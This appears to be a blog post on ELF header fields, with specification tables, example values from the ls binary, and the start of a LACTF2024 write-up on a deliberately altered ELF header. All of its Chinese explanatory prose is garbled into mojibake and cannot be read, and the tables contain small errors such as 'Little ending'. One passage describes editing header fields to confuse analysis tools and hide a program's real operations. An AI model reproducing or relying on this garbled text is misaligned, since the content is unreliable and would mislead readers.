<p>å…¶ä¸­å„ä¸ªå­—æ®µæ‰€å å­—èŠ‚æ•°å¦‚ä¸‹:</p>
<table>
<thead>
<tr>
<th align="left"></th>
<th>In ELF32&#x2F;bytes</th>
<th>In ELF64&#x2F;bytes</th>
</tr>
</thead>
<tbody><tr>
<td align="left">e_ident[16]</td>
<td>16</td>
<td>16</td>
</tr>
<tr>
<td align="left">e_type</td>
<td>2</td>
<td>2</td>
</tr>
<tr>
<td align="left">e_machine</td>
<td>2</td>
<td>2</td>
</tr>
<tr>
<td align="left">e_version</td>
<td>4</td>
<td>4</td>
</tr>
<tr>
<td align="left">e_entry</td>
<td>4</td>
<td>8</td>
</tr>
<tr>
<td align="left">e_phoff</td>
<td>4</td>
<td>8</td>
</tr>
<tr>
<td align="left">e_shoff</td>
<td>4</td>
<td>8</td>
</tr>
<tr>
<td align="left">e_flags</td>
<td>4</td>
<td>4</td>
</tr>
<tr>
<td align="left">e_ehsize</td>
<td>2</td>
<td>2</td>
</tr>
<tr>
<td align="left">e_phentsize</td>
<td>2</td>
<td>2</td>
</tr>
<tr>
<td align="left">e_phnum</td>
<td>2</td>
<td>2</td>
</tr>
<tr>
<td align="left">e_shentsize</td>
<td>2</td>
<td>2</td>
</tr>
<tr>
<td align="left">e_shnum</td>
<td>2</td>
<td>2</td>
</tr>
<tr>
<td align="left">e_shstrndx</td>
<td>2</td>
<td>2</td>
</tr>
<tr>
<td align="left">Total</td>
<td>52</td>
<td>64</td>
</tr>
</tbody></table>
<h3 id="å„ä¸ªå­—æ®µæ‰€å«å€¼çš„å«ä¹‰"><a href="#å„ä¸ªå­—æ®µæ‰€å«å€¼çš„å«ä¹‰" class="headerlink" title="å„ä¸ªå­—æ®µæ‰€å«å€¼çš„å«ä¹‰"></a>å„ä¸ªå­—æ®µæ‰€å«å€¼çš„å«ä¹‰</h3><h4 id="e-ident"><a href="#e-ident" class="headerlink" title="e_ident"></a>e_ident</h4><p>å‚è€ƒä¿¡æ¯:<a href="https://refspecs.linuxfoundation.org/elf/gabi4+/ch4.eheader.html#elfid">https://refspecs.linuxfoundation.org/elf/gabi4+/ch4.eheader.html#elfid</a></p>
<p>å…¶ä¸­ç´¢å¼•å¯¹åº”çš„ä¿¡æ¯å¦‚ä¸‹:</p>
<table>
<thead>
<tr>
<th><strong>Name</strong></th>
<th><strong>Value</strong></th>
<th><strong>Purpose</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>EI_MAG0</code></td>
<td><code>0</code></td>
<td>File identification</td>
</tr>
<tr>
<td><code>EI_MAG1</code></td>
<td><code>1</code></td>
<td>File identification</td>
</tr>
<tr>
<td><code>EI_MAG2</code></td>
<td><code>2</code></td>
<td>File identification</td>
</tr>
<tr>
<td><code>EI_MAG3</code></td>
<td><code>3</code></td>
<td>File identification</td>
</tr>
<tr>
<td><code>EI_CLASS</code></td>
<td><code>4</code></td>
<td>File class</td>
</tr>
<tr>
<td><code>EI_DATA</code></td>
<td><code>5</code></td>
<td>Data encoding</td>
</tr>
<tr>
<td><code>EI_VERSION</code></td>
<td><code>6</code></td>
<td>File version</td>
</tr>
<tr>
<td><code>EI_OSABI</code></td>
<td><code>7</code></td>
<td>Operating system&#x2F;ABI identification</td>
</tr>
<tr>
<td><code>EI_ABIVERSION</code></td>
<td><code>8</code></td>
<td>ABI version</td>
</tr>
<tr>
<td><code>EI_PAD</code></td>
<td><code>9</code></td>
<td>Start of padding bytes</td>
</tr>
<tr>
<td><code>EI_NIDENT</code></td>
<td><code>16</code></td>
<td>Size of <code>e_ident[]</code></td>
</tr>
</tbody></table>
<p>å‰4å­—èŠ‚é€šå¸¸æ˜¯<code>b&quot;\x7fELF&quot;</code></p>
<p>e_ident[CLASS]æŒ‡å®šäº†è¯¥ç¨‹åºä¸ºå¤šå°‘ä½ç¨‹åº:</p>
<table>
<thead>
<tr>
<th><strong>Name</strong></th>
<th><strong>Value</strong></th>
<th><strong>Meaning</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>ELFCLASSNONE</code></td>
<td><code>0</code></td>
<td>Invalid class</td>
</tr>
<tr>
<td><code>ELFCLASS32</code></td>
<td><code>1</code></td>
<td>32-bit objects</td>
</tr>
<tr>
<td><code>ELFCLASS64</code></td>
<td><code>2</code></td>
<td>64-bit objects</td>
</tr>
</tbody></table>
<p>e_ident[DATA]åˆ¶å®šäº†è¯¥ç¨‹åºä¸­æ•°æ®çš„ç¼–ç æ–¹å¼:</p>
<table>
<thead>
<tr>
<th><strong>Name</strong></th>
<th><strong>Value</strong></th>
<th><strong>Meaning</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>ELFDATANONE</code></td>
<td><code>0</code></td>
<td>Invalid data encoding</td>
</tr>
<tr>
<td><code>ELFDATA2LSB</code></td>
<td><code>1</code></td>
<td>Little ending</td>
</tr>
<tr>
<td><code>ELFDATA2MSB</code></td>
<td><code>2</code></td>
<td>Big ending</td>
</tr>
</tbody></table>
<p>e_ident[VERSION]æŒ‡å®šå½“å‰ELFçš„ç‰ˆæœ¬ å¿…é¡»ä¸ºEV_CURRENT  EV_CURRENTå®(æ­£å¸¸ä¸º1)ä¼šæ ¹æ®æœªç»æ›´æ”¹çš„ELFæ–‡ä»¶ç‰ˆæœ¬ç¡®å®š</p>
<p>e_ident[OSABI]åˆ¶å®šäº†ç¨‹åºåœ¨å“ªç§å¹³å°ä¸Šè¿è¡Œ ä½¿ç”¨å“ªç§ABI(<code>ABI æ˜¯ä¸€ä¸ªæ¥å£æ ‡å‡† ç”¨äºå®šä¹‰äºŒè¿›åˆ¶æ¥å£çš„è§„èŒƒ åŒ…æ‹¬å‡½æ•°è°ƒç”¨çº¦å®š, æ•°æ®ç±»å‹å¤§å°, ç³»ç»Ÿè°ƒç”¨ç­‰æ–¹é¢çš„è§„å®š</code>):</p>
<table>
<thead>
<tr>
<th><strong>Name</strong></th>
<th><strong>Value</strong></th>
<th><strong>Meaning</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>ELFOSABI_NONE</code></td>
<td><code>0</code></td>
<td>No extensions or unspecified</td>
</tr>
<tr>
<td><code>ELFOSABI_HPUX</code></td>
<td><code>1</code></td>
<td>Hewlett-Packard HP-UX</td>
</tr>
<tr>
<td><code>ELFOSABI_NETBSD</code></td>
<td><code>2</code></td>
<td>NetBSD</td>
</tr>
<tr>
<td><code>ELFOSABI_LINUX</code></td>
<td><code>3</code></td>
<td>Linux</td>
</tr>
<tr>
<td><code>ELFOSABI_SOLARIS</code></td>
<td><code>6</code></td>
<td>Sun Solaris</td>
</tr>
<tr>
<td><code>ELFOSABI_AIX</code></td>
<td><code>7</code></td>
<td>AIX</td>
</tr>
<tr>
<td><code>ELFOSABI_IRIX</code></td>
<td><code>8</code></td>
<td>IRIX</td>
</tr>
<tr>
<td><code>ELFOSABI_FREEBSD</code></td>
<td><code>9</code></td>
<td>FreeBSD</td>
</tr>
<tr>
<td><code>ELFOSABI_TRU64</code></td>
<td><code>10</code></td>
<td>Compaq TRU64 UNIX</td>
</tr>
<tr>
<td><code>ELFOSABI_MODESTO</code></td>
<td><code>11</code></td>
<td>Novell Modesto</td>
</tr>
<tr>
<td><code>ELFOSABI_OPENBSD</code></td>
<td><code>12</code></td>
<td>Open BSD</td>
</tr>
<tr>
<td><code>ELFOSABI_OPENVMS</code></td>
<td><code>13</code></td>
<td>Open VMS</td>
</tr>
<tr>
<td><code>ELFOSABI_NSK</code></td>
<td><code>14</code></td>
<td>Hewlett-Packard Non-Stop Kernel</td>
</tr>
<tr>
<td></td>
<td><code>64-255</code></td>
<td>Architecture-specific value range</td>
</tr>
</tbody></table>
<p>e_ident[EI_ABIVERSION]æŒ‡å®šäº†æ‰€ä½¿ç”¨çš„ABIç‰ˆæœ¬ åŒºåˆ†ä¸å…¼å®¹çš„ç‰ˆæœ¬</p>
<p>e_ident[EI_PAD]åˆ¶å®šäº†e_identæœªä½¿ç”¨çš„å­—èŠ‚æ•° ä¸€å¼€å§‹ä¸º0 åœ¨æœªæ¥ä½¿ç”¨äº†è¿™äº›æœªä½¿ç”¨çš„å­—èŠ‚æ•°æ—¶ä¼šæ”¹å˜</p>
<p>ä»¥64ä½Ubuntuçš„lsç¨‹åºä¸ºä¾‹:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/02/26/20240226-165216.png" alt="QQæˆªå›¾20240226163704"></p>
<h4 id="e-type"><a href="#e-type" class="headerlink" title="e_type"></a>e_type</h4><p>æ ‡è®°è¯¥æ–‡ä»¶å…·ä½“ç±»å‹:</p>
<table>
<thead>
<tr>
<th><strong>Name</strong></th>
<th><strong>Value</strong></th>
<th><strong>Meaning</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>ET_NONE</code></td>
<td><code>0</code></td>
<td>No file type</td>
</tr>
<tr>
<td><code>ET_REL</code></td>
<td><code>1</code></td>
<td>Relocatable file</td>
</tr>
<tr>
<td><code>ET_EXEC</code></td>
<td><code>2</code></td>
<td>Executable file</td>
</tr>
<tr>
<td><code>ET_DYN</code></td>
<td><code>3</code></td>
<td>Shared object file</td>
</tr>
<tr>
<td><code>ET_CORE</code></td>
<td><code>4</code></td>
<td>Core file</td>
</tr>
<tr>
<td><code>ET_LOOS</code></td>
<td><code>0xfe00</code></td>
<td>Operating system-specific</td>
</tr>
<tr>
<td><code>ET_HIOS</code></td>
<td><code>0xfeff</code></td>
<td>Operating system-specific</td>
</tr>
<tr>
<td><code>ET_LOPROC</code></td>
<td><code>0xff00</code></td>
<td>Processor-specific</td>
</tr>
<tr>
<td><code>ET_HIPROC</code></td>
<td><code>0xffff</code></td>
<td>Processor-specific</td>
</tr>
</tbody></table>
<p>å¯¹äºls è¿™ä¸ªå€¼æ˜¯<code>03 00</code>ä¹Ÿå°±æ˜¯å°ç«¯åºçš„<code>3</code></p>
<h4 id="e-machine"><a href="#e-machine" class="headerlink" title="e_machine"></a>e_machine</h4><p>æŒ‡å®šäº†ç¨‹åºæœºå™¨ç æ‰€ä½¿ç”¨çš„æ±‡ç¼–ä½“ç³»:</p>
<table>
<thead>
<tr>
<th><strong>Name</strong></th>
<th><strong>Value</strong></th>
<th><strong>Meaning</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>EM_NONE</code></td>
<td><code>0</code></td>
<td>No machine</td>
</tr>
<tr>
<td><code>EM_M32</code></td>
<td><code>1</code></td>
<td>AT&amp;T WE 32100</td>
</tr>
<tr>
<td><code>EM_SPARC</code></td>
<td><code>2</code></td>
<td>SPARC</td>
</tr>
<tr>
<td><code>EM_386</code></td>
<td><code>3</code></td>
<td>Intel 80386</td>
</tr>
<tr>
<td><code>EM_68K</code></td>
<td><code>4</code></td>
<td>Motorola 68000</td>
</tr>
<tr>
<td><code>EM_88K</code></td>
<td><code>5</code></td>
<td>Motorola 88000</td>
</tr>
<tr>
<td>reserved</td>
<td><code>6</code></td>
<td>Reserved for future use (was <code>EM_486</code>)</td>
</tr>
<tr>
<td><code>EM_860</code></td>
<td><code>7</code></td>
<td>Intel 80860</td>
</tr>
<tr>
<td><code>EM_MIPS</code></td>
<td><code>8</code></td>
<td>MIPS I Architecture</td>
</tr>
<tr>
<td><code>EM_S370</code></td>
<td><code>9</code></td>
<td>IBM System&#x2F;370 Processor</td>
</tr>
<tr>
<td><code>EM_MIPS_RS3_LE</code></td>
<td><code>10</code></td>
<td>MIPS RS3000 Little-endian</td>
</tr>
<tr>
<td>reserved</td>
<td><code>11-14</code></td>
<td>Reserved for future use</td>
</tr>
<tr>
<td><code>EM_PARISC</code></td>
<td><code>15</code></td>
<td>Hewlett-Packard PA-RISC</td>
</tr>
<tr>
<td>reserved</td>
<td><code>16</code></td>
<td>Reserved for future use</td>
</tr>
<tr>
<td><code>EM_VPP500</code></td>
<td><code>17</code></td>
<td>Fujitsu VPP500</td>
</tr>
<tr>
<td><code>EM_SPARC32PLUS</code></td>
<td><code>18</code></td>
<td>Enhanced instruction set SPARC</td>
</tr>
<tr>
<td><code>EM_960</code></td>
<td><code>19</code></td>
<td>Intel 80960</td>
</tr>
<tr>
<td><code>EM_PPC</code></td>
<td><code>20</code></td>
<td>PowerPC</td>
</tr>
<tr>
<td><code>EM_PPC64</code></td>
<td><code>21</code></td>
<td>64-bit PowerPC</td>
</tr>
<tr>
<td><code>EM_S390</code></td>
<td><code>22</code></td>
<td>IBM System&#x2F;390 Processor</td>
</tr>
<tr>
<td>reserved</td>
<td><code>23-35</code></td>
<td>Reserved for future use</td>
</tr>
<tr>
<td><code>EM_V800</code></td>
<td><code>36</code></td>
<td>NEC V800</td>
</tr>
<tr>
<td><code>EM_FR20</code></td>
<td><code>37</code></td>
<td>Fujitsu FR20</td>
</tr>
<tr>
<td><code>EM_RH32</code></td>
<td><code>38</code></td>
<td>TRW RH-32</td>
</tr>
<tr>
<td><code>EM_RCE</code></td>
<td><code>39</code></td>
<td>Motorola RCE</td>
</tr>
<tr>
<td><code>EM_ARM</code></td>
<td><code>40</code></td>
<td>Advanced RISC Machines ARM</td>
</tr>
<tr>
<td><code>EM_ALPHA</code></td>
<td><code>41</code></td>
<td>Digital Alpha</td>
</tr>
<tr>
<td><code>EM_SH</code></td>
<td><code>42</code></td>
<td>Hitachi SH</td>
</tr>
<tr>
<td><code>EM_SPARCV9</code></td>
<td><code>43</code></td>
<td>SPARC Version 9</td>
</tr>
<tr>
<td><code>EM_TRICORE</code></td>
<td><code>44</code></td>
<td>Siemens TriCore embedded processor</td>
</tr>
<tr>
<td><code>EM_ARC</code></td>
<td><code>45</code></td>
<td>Argonaut RISC Core, Argonaut Technologies Inc.</td>
</tr>
<tr>
<td><code>EM_H8_300</code></td>
<td><code>46</code></td>
<td>Hitachi H8&#x2F;300</td>
</tr>
<tr>
<td><code>EM_H8_300H</code></td>
<td><code>47</code></td>
<td>Hitachi H8&#x2F;300H</td>
</tr>
<tr>
<td><code>EM_H8S</code></td>
<td><code>48</code></td>
<td>Hitachi H8S</td>
</tr>
<tr>
<td><code>EM_H8_500</code></td>
<td><code>49</code></td>
<td>Hitachi H8&#x2F;500</td>
</tr>
<tr>
<td><code>EM_IA_64</code></td>
<td><code>50</code></td>
<td>Intel IA-64 processor architecture</td>
</tr>
<tr>
<td><code>EM_MIPS_X</code></td>
<td><code>51</code></td>
<td>Stanford MIPS-X</td>
</tr>
<tr>
<td><code>EM_COLDFIRE</code></td>
<td><code>52</code></td>
<td>Motorola ColdFire</td>
</tr>
<tr>
<td><code>EM_68HC12</code></td>
<td><code>53</code></td>
<td>Motorola M68HC12</td>
</tr>
<tr>
<td><code>EM_MMA</code></td>
<td><code>54</code></td>
<td>Fujitsu MMA Multimedia Accelerator</td>
</tr>
<tr>
<td><code>EM_PCP</code></td>
<td><code>55</code></td>
<td>Siemens PCP</td>
</tr>
<tr>
<td><code>EM_NCPU</code></td>
<td><code>56</code></td>
<td>Sony nCPU embedded RISC processor</td>
</tr>
<tr>
<td><code>EM_NDR1</code></td>
<td><code>57</code></td>
<td>Denso NDR1 microprocessor</td>
</tr>
<tr>
<td><code>EM_STARCORE</code></td>
<td><code>58</code></td>
<td>Motorola Star*Core processor</td>
</tr>
<tr>
<td><code>EM_ME16</code></td>
<td><code>59</code></td>
<td>Toyota ME16 processor</td>
</tr>
<tr>
<td><code>EM_ST100</code></td>
<td><code>60</code></td>
<td>STMicroelectronics ST100 processor</td>
</tr>
<tr>
<td><code>EM_TINYJ</code></td>
<td><code>61</code></td>
<td>Advanced Logic Corp. TinyJ embedded processor family</td>
</tr>
<tr>
<td><code>EM_X86_64</code></td>
<td><code>62</code></td>
<td>AMD x86-64 architecture</td>
</tr>
<tr>
<td><code>EM_PDSP</code></td>
<td><code>63</code></td>
<td>Sony DSP Processor</td>
</tr>
<tr>
<td><code>EM_PDP10</code></td>
<td><code>64</code></td>
<td>Digital Equipment Corp. PDP-10</td>
</tr>
<tr>
<td><code>EM_PDP11</code></td>
<td><code>65</code></td>
<td>Digital Equipment Corp. PDP-11</td>
</tr>
<tr>
<td><code>EM_FX66</code></td>
<td><code>66</code></td>
<td>Siemens FX66 microcontroller</td>
</tr>
<tr>
<td><code>EM_ST9PLUS</code></td>
<td><code>67</code></td>
<td>STMicroelectronics ST9+ 8&#x2F;16 bit microcontroller</td>
</tr>
<tr>
<td><code>EM_ST7</code></td>
<td><code>68</code></td>
<td>STMicroelectronics ST7 8-bit microcontroller</td>
</tr>
<tr>
<td><code>EM_68HC16</code></td>
<td><code>69</code></td>
<td>Motorola MC68HC16 Microcontroller</td>
</tr>
<tr>
<td><code>EM_68HC11</code></td>
<td><code>70</code></td>
<td>Motorola MC68HC11 Microcontroller</td>
</tr>
<tr>
<td><code>EM_68HC08</code></td>
<td><code>71</code></td>
<td>Motorola MC68HC08 Microcontroller</td>
</tr>
<tr>
<td><code>EM_68HC05</code></td>
<td><code>72</code></td>
<td>Motorola MC68HC05 Microcontroller</td>
</tr>
<tr>
<td><code>EM_SVX</code></td>
<td><code>73</code></td>
<td>Silicon Graphics SVx</td>
</tr>
<tr>
<td><code>EM_ST19</code></td>
<td><code>74</code></td>
<td>STMicroelectronics ST19 8-bit microcontroller</td>
</tr>
<tr>
<td><code>EM_VAX</code></td>
<td><code>75</code></td>
<td>Digital VAX</td>
</tr>
<tr>
<td><code>EM_CRIS</code></td>
<td><code>76</code></td>
<td>Axis Communications 32-bit embedded processor</td>
</tr>
<tr>
<td><code>EM_JAVELIN</code></td>
<td><code>77</code></td>
<td>Infineon Technologies 32-bit embedded processor</td>
</tr>
<tr>
<td><code>EM_FIREPATH</code></td>
<td><code>78</code></td>
<td>Element 14 64-bit DSP Processor</td>
</tr>
<tr>
<td><code>EM_ZSP</code></td>
<td><code>79</code></td>
<td>LSI Logic 16-bit DSP Processor</td>
</tr>
<tr>
<td><code>EM_MMIX</code></td>
<td><code>80</code></td>
<td>Donald Knuthâ€™s educational 64-bit processor</td>
</tr>
<tr>
<td><code>EM_HUANY</code></td>
<td><code>81</code></td>
<td>Harvard University machine-independent object files</td>
</tr>
<tr>
<td><code>EM_PRISM</code></td>
<td><code>82</code></td>
<td>SiTera Prism</td>
</tr>
<tr>
<td><code>EM_AVR</code></td>
<td><code>83</code></td>
<td>Atmel AVR 8-bit microcontroller</td>
</tr>
<tr>
<td><code>EM_FR30</code></td>
<td><code>84</code></td>
<td>Fujitsu FR30</td>
</tr>
<tr>
<td><code>EM_D10V</code></td>
<td><code>85</code></td>
<td>Mitsubishi D10V</td>
</tr>
<tr>
<td><code>EM_D30V</code></td>
<td><code>86</code></td>
<td>Mitsubishi D30V</td>
</tr>
<tr>
<td><code>EM_V850</code></td>
<td><code>87</code></td>
<td>NEC v850</td>
</tr>
<tr>
<td><code>EM_M32R</code></td>
<td><code>88</code></td>
<td>Mitsubishi M32R</td>
</tr>
<tr>
<td><code>EM_MN10300</code></td>
<td><code>89</code></td>
<td>Matsushita MN10300</td>
</tr>
<tr>
<td><code>EM_MN10200</code></td>
<td><code>90</code></td>
<td>Matsushita MN10200</td>
</tr>
<tr>
<td><code>EM_PJ</code></td>
<td><code>91</code></td>
<td>picoJava</td>
</tr>
<tr>
<td><code>EM_OPENRISC</code></td>
<td><code>92</code></td>
<td>OpenRISC 32-bit embedded processor</td>
</tr>
<tr>
<td><code>EM_ARC_A5</code></td>
<td><code>93</code></td>
<td>ARC Cores Tangent-A5</td>
</tr>
<tr>
<td><code>EM_XTENSA</code></td>
<td><code>94</code></td>
<td>Tensilica Xtensa Architecture</td>
</tr>
<tr>
<td><code>EM_VIDEOCORE</code></td>
<td><code>95</code></td>
<td>Alphamosaic VideoCore processor</td>
</tr>
<tr>
<td><code>EM_TMM_GPP</code></td>
<td><code>96</code></td>
<td>Thompson Multimedia General Purpose Processor</td>
</tr>
<tr>
<td><code>EM_NS32K</code></td>
<td><code>97</code></td>
<td>National Semiconductor 32000 series</td>
</tr>
<tr>
<td><code>EM_TPC</code></td>
<td><code>98</code></td>
<td>Tenor Network TPC processor</td>
</tr>
<tr>
<td><code>EM_SNP1K</code></td>
<td><code>99</code></td>
<td>Trebia SNP 1000 processor</td>
</tr>
<tr>
<td><code>EM_ST200</code></td>
<td><code>100</code></td>
<td>STMicroelectronics (<a href="http://www.st.com/">www.st.com</a>) ST200 microcontroller</td>
</tr>
</tbody></table>
<p>åœ¨lsä¸­è¿™ä¸ªå€¼ä½<code>3E 00</code>å³<code>EM_X86_64</code></p>
<h4 id="e-version"><a href="#e-version" class="headerlink" title="e_version"></a>e_version</h4><p>å¦‚ä¸Šè¿°e_ident[VERSION]æ‰€è¯´ æ ‡è®°å½“å‰ç¨‹åºç‰ˆæœ¬å·</p>
<table>
<thead>
<tr>
<th><strong>Name</strong></th>
<th><strong>Value</strong></th>
<th><strong>Meaning</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>EV_NONE</code></td>
<td><code>0</code></td>
<td>Invalid version</td>
</tr>
<tr>
<td><code>EV_CURRENT</code></td>
<td><code>1</code></td>
<td>Current version</td>
</tr>
</tbody></table>
<p>åœ¨lsä¸­è¿™ä¸ªå€¼ä¸º<code>01 00 00 00</code></p>
<h4 id="e-entry"><a href="#e-entry" class="headerlink" title="e_entry"></a>e_entry</h4><p>æŒ‡å®šä¸€ä¸ªè™šæ‹Ÿåœ°å€æ¥è®©ç³»ç»Ÿä»è¿™ä¸ªç›¸å¯¹æ–‡ä»¶å¤´çš„è¿™ä¸ªåç§»åœ°å€å¼€å§‹ç¿»è¯‘æœºå™¨ç å¹¶ç”Ÿæˆè¿›ç¨‹ è¦ä¿®æ”¹ç¨‹åºåŠŸèƒ½ä¸»è¦å°±æ˜¯é€šè¿‡ä¿®æ”¹è¿™ä¸ªå€¼</p>
<p>åœ¨lsä¸­ è¿™ä¸ªå€¼ä¸º<code>A0 6A 00 00 00 00 00 00 00</code> æ„å‘³ç€lsçš„ç¨‹åºå…¥å£ç‚¹æ˜¯<code>0x6AA0</code></p>
<h4 id="e-phoff-e-shoff"><a href="#e-phoff-e-shoff" class="headerlink" title="e_phoff &amp; e_shoff"></a>e_phoff &amp; e_shoff</h4><p>åˆ†åˆ«æŒ‡å®šäº†ç¨‹åºå¤´è¡¨å’Œæ®µè¡¨çš„åç§»é‡ è‹¥æ²¡æœ‰åˆ™ä¸º0</p>
<h4 id="e-flags"><a href="#e-flags" class="headerlink" title="e_flags"></a>e_flags</h4><p>å‚¨å­˜äº†å†³å®šå¤„ç†å™¨å¦‚ä½•å¤„ç†ç¨‹åºçš„æ ‡å¿— å¯¹ä¸åŒå¤„ç†å™¨æœ‰ä¸åŒçš„å«ä¹‰ å¸¸è§çš„å¦‚ä¸‹:</p>
<ol>
<li><strong>æ‰§è¡Œæ¨¡å¼æ ‡å¿—</strong>:  æŒ‡ç¤ºç¨‹åºè¿è¡Œçš„ç‰¹å®šæ‰§è¡Œæ¨¡å¼æˆ–ç‰¹æƒçº§åˆ« å¦‚ç”¨æˆ·æ¨¡å¼ , å†…æ ¸æ¨¡å¼ç­‰ </li>
<li><strong>å¤„ç†å™¨ç‰¹æ€§</strong>:  æŒ‡ç¤ºå¤„ç†å™¨çš„ä¸€äº›ç‰¹å®šç‰¹æ€§æˆ–åŠŸèƒ½ å¦‚æµ®ç‚¹è¿ç®—æ”¯æŒ , å¤šæ ¸å¤„ç†å™¨ç­‰ </li>
<li><strong>ä¼˜åŒ–æ ‡å¿—</strong>:  æŒ‡ç¤ºç¼–è¯‘å™¨åœ¨ç”Ÿæˆä»£ç æ—¶åº”è¯¥ä½¿ç”¨çš„ä¼˜åŒ–çº§åˆ«æˆ–ä¼˜åŒ–ç­–ç•¥ </li>
<li><strong>å®‰å…¨æ ‡å¿—</strong>:  æŒ‡ç¤ºä¸€äº›å®‰å…¨ç‰¹æ€§æˆ–å®‰å…¨ç­–ç•¥ å¦‚æ ˆä¿æŠ¤ , å†…å­˜ä¿æŠ¤ç­‰ </li>
<li><strong>ABI ç‰ˆæœ¬æ ‡å¿—</strong>:  æŒ‡ç¤ºä½¿ç”¨çš„ ABI ç‰ˆæœ¬æˆ–å…¼å®¹æ€§æ ‡å¿— ç”¨äºæŒ‡å®šç¨‹åºä¸æ“ä½œç³»ç»Ÿæˆ–å…¶ä»–åº“çš„å…¼å®¹æ€§</li>
</ol>
<h4 id="e-ehsize"><a href="#e-ehsize" class="headerlink" title="e_ehsize"></a>e_ehsize</h4><p>(<del>eh æ˜¯é‚£ä¸ªehå—</del>)æ ‡è®°äº†æ–‡ä»¶å¤´çš„å¤§å° æ­£å¦‚ä¸Šé¢ç»Ÿè®¡çš„ lsä¸­è¿™ä¸ªå€¼ä¸º<code>40 00</code>å³64</p>
<h4 id="e-phentsize"><a href="#e-phentsize" class="headerlink" title="e_phentsize"></a>e_phentsize</h4><p>æ ‡è®°äº†ç¨‹åºå¤´è¡¨ä¸­æ¯ä¸ªå­—æ®µçš„å­—èŠ‚å¤§å°(æ¯ä¸ªå­—æ®µçš„å¤§å°ç›¸åŒ) åœ¨lsä¸­ä¸º<code>38 00</code></p>
<h4 id="e-phnum"><a href="#e-phnum" class="headerlink" title="e_phnum"></a>e_phnum</h4><p>æ ‡è®°äº†ç¨‹åºå¤´è¡¨çš„ä¸ªæ•° ä¸<code>e_phentsize</code>çš„æˆç»©å°±æ˜¯ç¨‹åºå¤´è¡¨çš„å¤§å° è‹¥æ²¡æœ‰åˆ™ä¸º0 åœ¨lsä¸­ä¸º<code>0D 00</code></p>
<h4 id="e-shentsize-e-shnum"><a href="#e-shentsize-e-shnum" class="headerlink" title="e_shentsize &amp; e_shnum"></a>e_shentsize &amp; e_shnum</h4><p>æ ‡è®°æ®µä¿¡æ¯ ä¸ä¸Šè¿°ä¸¤ä¸ªåŒç† ä¸åŒçš„æ˜¯æ®µå¤´è¡¨çš„æ•°é‡å¦‚æœè¶…å‡ºäº†é¢„ç•™ç´¢å¼•å€¼<code>0xff00</code>çš„è¯<code>e_shnum</code>çš„å€¼ä¼šè¢«è®¾ä¸º0 å¹¶å°†çœŸæ­£çš„å€¼æ”¾å…¥æ®µå¤´è¡¨çš„<code>sh_size</code>æ•°ç»„çš„ç´¢å¼•ä¸º0çš„ä½ç½®</p>
<h4 id="e-shstrndx"><a href="#e-shstrndx" class="headerlink" title="e_shstrndx"></a>e_shstrndx</h4><p>ä¸æ®µåè¡¨ä¸€åŒæ ‡è®°æ®µå¤´è¡¨çš„å…¥å£ç´¢å¼• å¦‚æœæ²¡æœ‰æ®µåè¡¨åˆ™å‚¨å­˜<code>SHN_UNDEF</code> ä¸æ®µå¤´è¡¨æ•°é‡ç±»ä¼¼è¶…å‡º<code>0xff00</code>çš„è¯ä¼šå‚¨å­˜åœ¨æ®µå¤´è¡¨çš„<code>sh_link</code>æ•°ç»„çš„ç´¢å¼•ä¸º0çš„ä½ç½®</p>
<h3 id="åº”ç”¨åœºåˆ"><a href="#åº”ç”¨åœºåˆ" class="headerlink" title="åº”ç”¨åœºåˆ"></a>åº”ç”¨åœºåˆ</h3><p>ä¿®æ”¹æŸäº›ä¸ç¨‹åºè¿è¡Œæ— å…³ä¿¡æ¯ä¸ä¼šå¯¼è‡´ç¨‹åºæ— æ³•è¿è¡Œ åŒæ—¶å¯ä»¥å¹²æ‰°åˆ†æè½¯ä»¶å¯¹å…¶çš„è¯†åˆ« åŒæ—¶æ”¹å˜ç¨‹åºå…¥å£ç‚¹è¿˜ä¼šå¯¼è‡´ç¨‹åºè·³è¿‡æŸæ®µæœºå™¨ç  ä»è€Œéšè—çœŸå®æ“ä½œ ä¾‹å¦‚:</p>
<h4 id="LACTF2024-rev-technically-correct-é­”æ”¹ELFæ–‡ä»¶å¤´"><a href="#LACTF2024-rev-technically-correct-é­”æ”¹ELFæ–‡ä»¶å¤´" class="headerlink" title="LACTF2024&#x2F;rev&#x2F;technically_correct | é­”æ”¹ELFæ–‡ä»¶å¤´"></a>LACTF2024&#x2F;rev&#x2F;technically_correct | é­”æ”¹ELFæ–‡ä»¶å¤´</h4><p>(<del>æ²¡é”™æˆ‘å°±æ˜¯ä¸ºäº†è¿™ç¢—é†‹åŒ…çš„é¥ºå­</del>)DIEæ— æ³•æ£€æµ‹åˆ°å¯æ‰§è¡Œæ–‡ä»¶ä¿¡æ¯ binwalkè¯†åˆ«é”™è¯¯ ç›´æ¥010æ‰“å¼€ ä¸lsåšä¸€ä¸‹å¯¹æ¯”:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/02/26/20240226-195321.png" alt="image-20240226195321494"></p>
<p>ä¸éš¾çœ‹å‡ºæ–‡ä»¶å¤´å·²ç»è¢«æ”¹å¾—å¾ˆæŠ½è±¡äº†</p>
<p>ç”¨IDAæ‰“å¼€ä¹Ÿæç¤ºå…¥å£é”™è¯¯:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/02/26/20240226-195519.png" alt="image-20240226195519637"></p>
<p>å¯¹æ¯”å¤šä¸ªELFæ–‡ä»¶çš„å…¥å£ç‚¹å¯ä»¥å‘ç°ä»¥ä¸‹ç‰¹å¾:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/02/26/20240226-200148.png" alt="image-20240226200148494"></p>
